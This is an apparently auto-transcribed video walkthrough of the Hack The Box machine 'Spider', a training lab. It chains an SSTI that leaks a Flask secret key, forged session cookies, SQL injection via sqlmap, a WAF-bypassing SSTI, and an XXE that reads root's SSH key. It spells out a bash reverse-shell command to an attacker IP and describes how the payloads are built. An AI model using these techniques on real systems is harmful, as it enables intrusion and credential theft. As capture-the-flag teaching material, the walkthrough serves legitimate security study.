 what's going on youtube this is ipsec i'm doing spider from hack the box which is all about the injections it's got an ssti service side template injection actually it has two of those it also has a sql injection structured query language and then to top it off it also does xml entity injection which is the extensible markup language so it starts off with a ssti that you're limited in using 10 characters for the payload so you can't really do things that are too malicious like a reverse shell but you can dump variable names the variable name you want to dump is config so you can dump the web applications config which includes the secret which it uses to sign cookies if you can sign the cookies you can change a parameter which is vulnerable to sql injection to get up to the administrative user of the web app and as the administrative user you can do a different ssti that you're not constrained by characters but if there is a waff a web application firewall preventing a lot of bad strings so you find out what the waff filters build a bypass for it and get a shell on the box on the box you can find out there's a different website running on port 8080 that has an xml injection but um let's just get into the box and start doing this as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the map directory and call it spider and then the ip address which is 10 10 10 243 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server additionally if we go and google this so 76p1 and then what was the other one one two zero three and put in launch pad it'll tell us exactly what distribution of ubuntu this is so this is seven six p one four bond two zero three that looks correct and it is bionic which is ubuntu 18. so it doesn't really help us too much but we can guess the distribution based upon the banner and then the next port we have is http on port 80 and is running engine x the banner also tells us it's ubuntu so off this i'm thinking well it's nginx so chances are it's running like python ruby node something like that because generally those languages i see running off of nginx and i more associate like php with apache it's not always going to be the case but this is just basic recon and that is my assumption we also have spider.htb as a domain name there but i'm going to go over to the page and see what happens and it redirects us to spyder.hdb so let's add it to our host file so 10 10 10 243 and we just want to take that off oh god delete too much there there we go and refresh this and we get a page ahmad furniture and it just looks like chairs we have a search and the keyword i'm going to search for a chair and oh he got a chair so the very first thing i'm going to do is put a single quote doesn't do anything i'm going to do a comment after that and it looks like it broke everything so if i still saw chairs there i'd be thinking this was some type of sql injection but i don't see anything with that we could paste this over to sqlmap to run in the background as we go wouldn't be a bad idea if i go to admin we just get to this login page we could try testing out some blank sql stuff but i'm going to go over to the register i'm going to try registering with please subscribe wants us to confirm our username which is pretty annoying let's try the password of password and we get username cannot be longer than 10 characters so i'll try ipsec put the password as password but i fat thing in that so go back and fix it and we get this weird uuid with password and we're logged in as ipsec and it doesn't really look like there's anything different if i go to admin it directs me back here if i go to user information we can see ipsec in my uu id i'm going to take a look at the cookie so copy this echo dash n and my cookie wait did not copy the cookie echo dash n paste this and it looks like a long string of characters if i base 64 decode it we can see it does stuff and then throws invalid input i'm guessing this invalid input is coming after this period i don't know what this piece is but this is looking very much like a jwt type token um this is probably some type of signature so it's signing this piece of information i'm just going to copy up to the first period and we can do echo dash n base64-d and we don't get that error so this is probably telling it how it's wait yeah this probably is telling it how it signed and then this is the actual signature would be my guess i actually don't know how this application signs things but we can see cart items uid and that's about it so i'm going to go back and see if i can add things to my cart if that chain i guess i can't see items i did not expect that so i don't know how i could add it to my cart if i just get internal server error whenever i try to access an item so the other thing we can try doing let's click discount no discounts available what happens is what does my browser send actually so if i go to proxy intercept click this i think that's just straight javascript because my browser didn't do anything so if i go register and we try registering with some bad characters so i'm going to do like um the double brackets which is ssti a single quote a double quote a star exclamation point just generic bad characters let's just see how the application behaves so i'm going to log in with password go here i can actually that is bizarre i did not expect to be able to see details of this so i added this to my cart i just want to refresh the page get my new cookie and i'm curious if now my cart has an item in it i'm going to say no because my cookie size did not change come on my clipboard is acting wonky echo dash n base64-d oh items one so it did it put a one there i was expecting it to have like some item i d which that is item one let's see let's do item three as well so now i have two items in my cart do we have it going to two yeah so one and three so that's how it adds items to the cart just again playing around with how the application looks if i go to admin wait did log me out see that's annoying okay did not log me out so i'm still logged in as that if i go to user information now i get internal server error so something in my username made the user information error and my thought right now is it is one of the single quotes a double quotes because it's probably some type of sql injection from my user id to my username because in the cookie the one thing that is missing is username so somehow the application translates the uuid to a username and i'm guessing it's doing it through an sql injection or not injection but sql query so let's log out i'm going to log back in with less bad characters so i'll just call ip and then do the two quotes password of password and let's log in go to chair that's working now it's weird that it wasn't working before but it's on video so i know i'm not crazy and looking at this it stripped out the double quote but we still have the single quote it did not error at all so the next thing i want to try is the ssti so that's the server side template injection so i'm going to do ip double bracket password of password login user information and internal server error so now we know we have some type of um server-side injection or ssti so the very first thing i'm going to try doing is extracting everything so if i do this this was in like go ssti a different box i did for a girling ssdi and i think this may extract information not exactly positive oh no there we go password if we go user information error so that doesn't do anything the other thing we could do we can include variables with this ssti so everything in these double brackets is some type of variable a very common one is config because everyone names the config config so i'm going to do config i'm going to do password of password uh it can't be longer than 10 characters echo dash n config wcc that's 12. we can actually get rid of these spaces probably and that will make it 10. so let's try that config password password login go to user information and now we have the config variable where username is so i'm going to do config.var i don't know what to call it maybe text would be a better thing but we can poke around at this and i'm going to replace all commas with a line break to make it a bit easier to read so let's see environment is production debug mode is turned off we have a secret key so we should be able to sign cookies at this point which could be good now the issue i have right now is my first thought is oh great i can sign a cookie which means i should be able to edit my username to make an ssti longer than 10 characters but again the username is not in my cookie so i can't really do that uh we have a session lifetime cookie name just looking for other things so the only thing really interesting in the config is this secret key and the secret key does let us um sign cookies so my next thought of this is first i want to just extract this and save oh i did not save paste but save the cookie name so my thought right now is it's going to be some type of sql injection still i still want to go from this user id to username and i'm guessing if i create a cookie and put a sql injection payload in the uuid then i'll be able to inject into username at least that's my thought going forward right now but first i'm gonna do um cookie secret and just paste this here so i have it from when i need it and then a great resource that kind of helps us do this attack is on hack trick so i'm gonna go to book.hacktrx.xyz and we're gonna search for flask so go here flask oh and i realize i'm probably skipping over one step of enumeration if i went back to the cookie so this config.var um the one thing i did to find out this was flask which python flask is i googled a few things um i'm going to google like a few just variable names so google that we'll add json sort keys in this config uh rate limit storage url and that sounds good let's pick another one uh trap bad request error so just giving a bunch of these variable names and we'll see what comes up uh how to keep sort of dictionary prevent flask uh we got a spider let's see bunch of flask things coming up with it so more json if i go to this this is the flask restful mentioning what key was this uh google have it json sort keys is because of this flask app package so we can also kind of enumerate the flask packages that are installed based upon these headers but we now know this is definitely flask so that's why i went and searched flask on hack tricks and that probably aired out because i disabled burp while it was going come on there we go and this is where i learned about the flask unsigned package so i ran pip3 to install this and then we can play with the flask cookie so let's go back to the application we can grab my whole cookie and then we can do flask dash unsign uh if you don't have it again pip3 install flask unsign says it on that web page and then we can do flask unsign decode cookie and then paste the cookie in so this gets us what the cookie is and what we wanted to do was to sign this with something else so i'm going to do flask unsign and then we'll do dash dash sign cookie i'm doing a double quote because i have single quotes in here and then i'm also going to put a backslash apostrophe to escape it and what's the other thing we want oh we need dash dash secret and then we need to put the cookie so i'm gonna cat cookie dot secret copy this paste that in and now we have a new cookie so the one thing i always like doing after i generate cookies is decode them again just in case i had an issue in this case the issue i probably have it's cookie not cookies but the issue i'd probably have is around that single quote but it looks like it did it correctly so now we have this cookie so i'm going to go paste this in and see what happens uh this page gets us nothing which is interesting if i go back here i can't access the home page anymore and somewhere on the homepage i think it translated and told me my user so i'm guessing that's where the error is uh we can fully confirm this by now we do the single quote and then let's put a comment afterwards and i'm going to paste this cookie in and let's see if it works there we go logged in as config so that's why we have that issue but this definitely allows us to confirm there's sql injection because we put this single quote in and errored we put the comma after the single quote or the comment after the single quote so it was now a valid sql statement and it worked so at this point we should try some type of sql injection and if you look at my old videos this is why i'd write like middleware if you go to like oxdf straight up i know he does it still um i'd create a flask app or a php app and put the cookie in a http argument and then send it i bet if you google like ipsec.rocks i know i said google ipsec.rocks but uh if we search middleware um we can find it on this but the better way to do this is through sql maps eval parameter and again if we go to this uh sqli with uh and flask cookie with sql map it shows us how to use this eval so i'm going to paste the sql map in we want to change it to be spider dot htb and then what this eval is going to allow us to do is run python code to generate the um data so it's going to generate and put it here wherever you have the star that's like telling sql map where to inject to so we're going from flask unsigned importing the session and then signing the session and the one thing we have to change here is this needs to be uuid instead of uid because that's what was in our cookie right here and we if we if this doesn't work then i'd also add the cart items to be part of the cookie but i don't think i need that so i'm going to leave that out and then of course we need to change the secret so i'm going to copy this put it here and then let's see the cookie session that's fine and dash dash dump is going to dump the database so custom injection marker do you want to process it yes we do and this next one it's saying you provide an http cookie however the url provides its own cookie do you want to merge them no we just want to use our own cookie do you want to url and code cookie values i don't know this one i'm going to just go with yes because it was default and we're going to see exactly what sql map finds i'm guessing it's going to find some type of time based attack first because it does time before it does union for whatever reason maybe because it detects things more often with time based i don't know uh header parameter cookie one time based do you want to test uh other dbms says dbms's yes we're gonna skip that because it confirmed it was my sequel we don't need a test for oracle and things like that and yes we want to include all my sql test so now it's going to do union and it tells us it is vulnerable to union injection do you want to keep testing other methods no because union injection is the most efficient form of sql injection so now we're going to start dumping the database and oh man it's done so we can look at this and see what we have uh looks like a bunch of data if we go near the top see this is users and we have a bunch of users but one you can see all my passwords with password but we have jiv and then a password of chiv was here so the first thing i'm going to do is try sshing so sshiv at spider.htb and permission deny public key so i guess we need let's see ssh disable public key authentication let's see there should be a dash o to disable that so let's see let's try stitching with this so ssh that jiv at spider dot hdb okay so it must only allow um public key authentication uh the reason why i added those is sometimes uh ssh will take you attempting keys to be password attempts and it tries testing every like every key your ssh client knows about and there's like if it hits the max number of attempts it may just deny you and not give you a password prompt so that's why i was trying that see i did this sounds like configuration so yeah so that's the correct arguments to do to bypass that so what surpass would we had that's in sql map still there we go shiv was here so let's just log into the application with this password so let's log out and of course if you're doing a pen test this would be a finding plain text passwords are bad and oh we can't do wait user name i wonder if it's jiv no it says username but then says uuid uh we should log in with this okay and now we're in the admin panel so here i'm going to be guessing that we can now do ssti with longer than 10 characters so i'm just gonna do a new message with double quote go to messages and don't see that here but we have something here there is a unfinished support portal so let's check this url real quick and this lets us create support tickets so i'm going to open something in back so we can go back here to view support and i'm going to revert this box because we have a lot of data in here so give me a minute to revert so now i'm reverted and if i go view support the dashboard is empty so i'm going to try putting something here so root ipsec.rocks and just put a message called test and it hit the waft because of a bad character period so i wonder if i can't do email i'm just going to do ipsec for the contact name and then do test and then submit this ticket has been posted and if i go over here we have the ticket so let's try doing this again but this time put a ssti that we know works submit go over here and we don't have anything we can try putting ssti as our username maybe it's here if i do test submit uh why do we need these brackets and contact value um not exactly sure i'm going to try include config like that test and we got an error message and nothing worked so definitely something was interesting here if i just do that for a payload and send it it errors so i think i have some type of ssti with this um i think if we google shavatto i don't probably pronounce that wrong ssti we can go to his blog and this is a really good read at what we're doing here but i'm just going to kind of explain it my way um i guess trying to think if i just go payload all the things and grab a payload and then um obfuscate it well we just use his payload because he's going through um how to enumerate this block and moving on but this isn't actually how he did it so let's try mine if i get stuck we'll move to his because uh you can always just read that blog post i think it's how oxdf did it because he's the one that pointed me towards that blog paris after i did the box so i'm gonna keep going down my logic so one silly thing here that i didn't notice at first um if we put a bat a bunch of bad characters uh like a bunch of special characters in this the waff tells us we have multiple bad characters i didn't know that when doing this box so this piece may be a bit redundant but when you start going up against a web application firewall that's what a waf stands for um it's not gonna be so kind to tell you what the bad characters are so this is what i do to kind of enumerate bad characters so the first thing let's just put a message into burp suite so we can copy this so we need to send this header so w fuzz dash h paste this in so now every request has that and then we need dash u for url so we can do dash u then http spyder.hdb paste that and then dash d for data and that's where we put this so i'm going to put the message here i'm going to put it in single quotes and then capital file is where we want to insert the data and then dash w for word list i'm going to do opt set list um fuzzing then special characters and we can see we get a lot of errors 429 now if i actually like googled 429 first i know exactly what the issue was but i went down a rabbit hole of like encoding because like oh i'm doing special characters i probably need to do some type of encoding and i thought if i just did dash e it should list options see w fuzz dash h dash e type list of available encoders why did not not list if i do my full w fuzz and do dash e will it tell me i don't know exactly how to list all the encoders w fuzz list encoders turn rip suite off go to google dash e oh i can't read apparently so it wants dash e and then wants me to specify what i want so dash e encoders because i can do payloads iterators printer scripts okay w fuzz dash e encoders and we can see all the various types of encoding we can do i'm gonna do that with less dash capital s so it prints a bit better and i'm going to do url in code so how you specify the encoder is whenever you do your word list you just do comma and then the encoder you want so i want to do url in code so now you can see everything is url encoded and i'm still getting these pesky 429 errors so at this point i google http error code 429 and we can see it's too many requests so this is probably the waff saying you're sending too much data to me slow down so we're going to do just that i'm going to take the url code off since i don't think we need it i'm going to do dash t1 this sets the threads to 1 which slows us down a little bit we get longer until the 429 but we still see them so then i'm going to do dash s for sleep let's see if i can sleep for half a second between request and we can see it's going much lower and we're not getting any error messages which is good and we can see i'm going to ctrl c this whenever we have something the waff doesn't like it's 1607 characters so i'm gonna do dash dash sc for show characters normally do h to hide things but in this case we only care about 1607 so i'm going to do this and going through come on it's going to take a little while because it's hiding every invalid request but it should show soon which characters are the bad ones um what did we get to something bad that was weird 1607 dash dash oh sh um so sc was looking at the http codes i saw the c capital like this is word so if i did sw it's going to show me words of 139 sl is going to show me show length no what is l uh let's go up lines so lines of 66 h is for characters it's the second one so this is how we would see the um only bad characters hopefully there we go so we can't use maybe that's a hyphen and an underscore a period is also bad a single quote is bad double quote doesn't seem to be bad but yeah so that's how we can enumerate the bad characters so now i go to payload all the things ssti and we should find a ssti injection that looks good to us so ssti server-side template injection and we can go down that was enumerating ginger too right into remote file so i think the payload on the website uses this and dot is a bad character so i think what it does instead of doing a dot is it puts everything in um like this form which is the same thing apparently in python so if we did like this and kept going down it would work probably so p open id dot read so it did something like that we'd have to change all these single quotes to be doubles which i was doing there we go and then maybe read like that i'm not exactly sure if you read the blog post that may make more sense but i was going down and i found this one if i do payload.text we can paste this in and this 5f this is escaping underscore so if i do man ascii 5f we can see that is the hex value for an underscore and in python python3 print backslash x5f it prints an underscore so that is why the payload has those because that's underscore underscore global so that's looking good we have to replace all the single quotes with double quotes because that was a bad character and then we can't do um the double brackets but we can do bracket percent we do that we just have to have a include and i'm looking if there's anything else i don't think so i'm going to try putting sleep five we can cap payload and then we can send this payload in if it takes us five seconds we'll be happy something tells me i messed up somewhere i spent a lot of time when doing this piece of the box playing with payloads so if this works first time uh it probably didn't work first time for anyone and this is just me because i've done the challenge once before we send this it's a good sign waiting five seconds four three there we go so we can see five thousand milliseconds i can change that to be two and this goes to two thousand milliseconds we're going to be happy so we are happy we have code execution through ssdi with this so the next thing we want to do is send us a reverse shell and the easiest way to do that is through base64 so i'm going to do echo bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 base 64 w0 copy this paste it in so we'll do echo that base64-d bash nclvnp 9001 send it we don't have a shell but this base64 does have some bad characters of itself because the server is probably taking this plus and translating it to a space so i'm going to highlight my whole payload do control u to url and code the payload and the server doesn't respond to us which is a good sign uh python3 dash c import pty pty dot spawn ben bash get over shell uh control z stdy raw minus echo f g enter enter you don't see the prompt but it is typing it so now we have a shell on this box export term to xtorm so i can clear it and now time for the fun stuff uh probably look around this web application to see if we can get a database password so let's see if i cat app.pi uh secret key we have that and we have a password for shivato so let's try this password so um ssh oh we can't stage with password we can do su though so shivato uh cat etsy pass wd grab for sh ending and shiv is the past user oh we are okay that's not really going to help us too much uh we may have the password to herself studio dash l paste uh control z i think i did the right password let's just go up and try this again so r 2 4 r to 4 so s u d o l paste so we do not have the password for chiv okay so we can go into my home directory if we go there is the key so we can get the user flag there is also ssh and we have an idrsa file so if we wanted to we can ssh into this box to get a better shell and i'd always recommend when you can use ssh definitely use it especially if the key is already there because that means if you want to take a break you can take a break and when you revert the machine you can go right back where you started so sh-i shaved.key shift at splitter.htb okay now our sshd so let's look at what else is here uh we could do mysql so the password was or not the password the website was in dub dub dub and the other thing we find interesting is there's 8080 there's also game so we have a second application it looks like the lsla game is owned by root web app is owned by shiv and html is empty so if we go in web app we can go back into the app my sequel we can copy this password and let's do my sequel dash u shavato dash p paste the password show databases and right now we just have shop so what i was hoping to see is game the other website that is on this box but it looks like the shavata user does not have access to it we could try logging in with root in that password axis denied i'm going to try the password a password or something still can't get in so we can't get into game uh we could go ver or not ver etsy apache actually it's nginx right nginx sites available see if there's a way we can access game so if i go let's just grab game star nothing here uh grep r game period so i'm just looking for all the config files that reference game and i don't see anything so at this point let's just access it so i'm going to do a new line actually before i do that the keys i hit is that so new line squiggly c and we go down this ssh prompt i'm going to do dash l to specify a local port forward and i'm going to specify 8000 so i'm going to listen on my box on 8000 it's going to afford it through this ssh session and then go to localhost 8080. so now port 8000 on my box is mapped to 8080 of localhost in theory let me turn off burp sweden hope it is yep so we got another web app password click what that's a troll that's not a link but we have a login let's intercept this where's burp suite go to proxy tab and we can try logging in with a name sign in logs in with name and sends version 1.0 that's fine forward we can turn intercept off and we have a page so my first thing is like try sql and all the uh not sql ssti and all the things because if an application is vulnerable to ssdi in one place it's probably vulnerable in other places logout uh does something then we logged in okay nothing but i have things open in burp suite so when i click and if it goes to a link it does something so right now it looks like this is all just javascript on the page because my burp suite isn't intercepting it so the next thing to do is probably look at the cookie this thing gives us so i'm going to copy this let's use that flask unsigned thing again so flask unsign decode cookie uh that's not it that is and we have lxml which is python's lib xml then this is encoded again looks like base64 because it ends with equals so let's decode this and base64 and we have some xml which is weird so we got 1.0.0 and if you remembered back in burp suite we sent that uh let's just send another one it's easier than finding it sometimes so let's log out i'm going to log in with this actually we're going to edit this sign in i'm going to log in with um admin so ssti payloads will generally require us to be able to do that which sets a variable and then i'm going to change this to version please subscribe let's just see what this makes a cookie so we're logged in i'm going to grab the cookie again and we'll do flask unsign decode cookie paste then we should decode this echo-n base64-d so we definitely have um a sql nd injection right now because we can change this username to be a variable in xml entity and we have injection up here so what we want to do is close this quote so we can define what the variable goes to so it's kind of a weird s like entity injection being we're doing it this way but um it works i guess so let's log out and then let's make a login request i'm just gonna do login request with come on there's the key admin like that make sure burp is intercepting sign in and now we want to go back to a web browser and google up a xml entity payload so let's go back to payload all the things xml and the injection and we have a payload on this page probably so what we need to do is this so right here we want to copy this the only thing what can be changing is this nd test we're going to put that to admin because that's declaring the variable so in this version we want to close out the quote put this in and then put a space after those double quotes i think this will be good and i can't remember forget to put admin here so i'm going to click forward and i want to show one really stupid thing that i notice i'm not sure if it's fixed in a later version of burp suite but if i click forward you'd think i would be able to click on this follow i'm going to copy this real quick so it's putting this set cookie thing here right so you think if i'd click for follow redirection it would set this cookie for me but it actually does not that's an old cookie right because i have much more data in there so if i send it with this you would get it or if you just used forward you also go back to the page and can get it so that is the one big catch when doing it that ate a lot of my time was figuring out that weird interaction but now that we can get the um the pass to bd file we could go and grab root root.text so send that i should just copy this cookie and then we'll go to a new pane or let's see okay follow and then we can change our cookie and this and we can see welcome and then whatever root.txt is so i'm going to go back here we can say make cookie if you didn't know you can just double click where the number is and then rename use cookie so go back to a mate cookie and we can also try root ssh id rsa uh grab the cookie go to use cookie and paste it in and we get the ssh key so i could also copy this and then the root dot key paste chmod 600 root dot key ssh root dot key root at spyder.hdb and we get in as root so that'll be the box hope you guys enjoyed it take care and i will see you all next time actually wait a second i want to see if this uses a database so let's go vert dub dub dub html uh not html game and we can go app.pi this secret key you're not going to crack that it's all in hex i don't see any sql graph ri sql my sequel let's see password a bunch of javascript see static templates game.ini if i look at game.ini it's using uw-sgi that's just running app so there's no database on this wait is this the app i don't think this is the app static templates yeah this is not the app there's something else running on this box oh what is listening on for it okay so this became interesting the easiest way i find to go into working directories is let's see let's do lnpt we should have the pit right maybe a we need less dash capital s pid pier okay so let's find let's do the same thing and then we want to grep for 8080 and there's probably a better way to do what i'm doing but we want pid 1566 so cd proc 1566 cwd and we're in there ls static so let's see let's go in templates is there game.html on port 8080 game.html no let's see this is confusing me now let's get rid of a cookie delete okay we can't access site because we're not logged in free gift with purchase this should be something good to search for grep dash r oh no wrong thing up dash r free gift with purchase so it looks like this website was just reskinned so game.html is really site and here's where the ssti i guess is and the username so yeah the game must have just been reskinned and they just left the things here if we go into app.pi and look at site we can see site create xml that gets login where is game yeah so a request on slash site is going to render the template game.html and then it's going to pass it this which is why we could do ssti because it's in the render template and our git username is pointed to our variables i believe so get username yeah it's pointing to something we control wait that's not ssti this is xml any injection maybe this isn't vulnerable ssti at all and i've been saying something wrong but uh this is a confusing beyond root thing uh hope you guys enjoyed it take care and i will see you all next week